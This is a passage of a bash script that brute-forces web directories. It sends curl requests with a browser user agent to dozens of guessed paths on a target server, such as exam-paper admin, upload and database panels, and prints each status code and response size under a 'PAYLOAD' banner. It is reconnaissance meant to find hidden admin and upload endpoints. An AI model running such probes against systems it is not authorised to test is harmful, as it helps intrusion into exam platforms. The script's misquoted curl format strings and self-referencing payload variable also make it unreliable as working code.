payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataProcessing_QPSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataProcessing_QPSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPProcessingAutomation/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPProcessingAutomation/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Uploader_QsnPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Uploader_QsnPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPControl-DataProcessing/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPControl-DataProcessing/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ManagementQPBatch/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ManagementQPBatch/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ExamPaperUploader/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ExamPaperUploader/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Admin-QPAuto/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Admin-QPAuto/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBulk-Handler/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBulk-Handler/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Dashboard_QPMaster/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Dashboard_QPMaster/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["OpsQPaperDoc/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"OpsQPaperDoc/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["MassUpload_QPBatch/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"MassUpload_QPBatch/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPAutoCloudSync/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPAutoCloudSync/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ServiceQPBData/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ServiceQPBData/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["PlatformQuestionPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"PlatformQuestionPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPaperDocDashboard/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPaperDocDashboard/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["BatchProcessor_QPCloud/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"BatchProcessor_QPCloud/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["FileProcessorQPB/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"FileProcessorQPB/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPManager_FileUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPManager_FileUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMasterCloudSync/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMasterCloudSync/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QsnPaper-Upload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QsnPaper-Upload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QuestionPaper-Portal/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QuestionPaper-Portal/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Processing_QPManager/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Processing_QPManager/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Tool-QPService/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Tool-QPService/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["SyncQPAuto/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"SyncQPAuto/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPaperDoc-Sync/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPaperDoc-Sync/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Dashboard_ExamPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Dashboard_ExamPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Sync-QPProcessing/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Sync-QPProcessing/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ModuleQsnPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ModuleQsnPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Dashboard_TestPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Dashboard_TestPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Admin_QPB/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Admin_QPB/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ManagementQPAdmin/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ManagementQPAdmin/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Q_PService/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Q_PService/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBManager/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBManager/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Handling_QuestionPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Handling_QuestionPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Module-QPService/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Module-QPService/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Uploader_QPAuto/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Uploader_QPAuto/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Monitoring-QPBatch/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Monitoring-QPBatch/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPaper_BatchProcessor/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPaper_BatchProcessor/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPUpload-Sync/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPUpload-Sync/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Dashboard-QPSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Dashboard-QPSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPCloud_MonitoringTool/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPCloud_MonitoringTool/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPDatabaseManagement/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPDatabaseManagement/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPUploader-BulkUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPUploader-BulkUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPCloudUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPCloudUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Platform-QP/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Platform-QP/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ProcessingSuite_QPAuto/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ProcessingSuite_QPAuto/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPFile_FileProcessor/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPFile_FileProcessor/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMaster-MonitoringTool/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMaster-MonitoringTool/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QsnPaper_DataSync/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QsnPaper_DataSync/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPFile-System/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPFile-System/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Admin_QPCloud/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Admin_QPCloud/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPProcessing_AutoUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPProcessing_AutoUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Handling-TestPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Handling-TestPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["AutoUploadQPControl/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"AutoUploadQPControl/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMgmt-Tool/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMgmt-Tool/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["PanelQP/"]: "
